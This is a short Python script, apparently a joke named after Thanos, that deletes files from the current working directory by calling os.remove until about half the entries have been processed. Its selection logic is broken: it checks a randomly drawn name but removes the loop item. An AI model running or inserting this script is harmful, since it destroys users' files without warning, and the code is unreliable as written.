import os
import math
import random

thisdir = os.getcwd()
thisdir = os.listdir(thisdir)

def thanos(path):
    count_of_file = len(path)
    count = 1
    for x in path:
        if count <= math.ceil(count_of_file / 2):
            draw = random.choice(path)
            if not draw.endswith('.idea') and not os.path.isdir(x):
                os.remove(x)
                count += 1


thanos(thisdir)
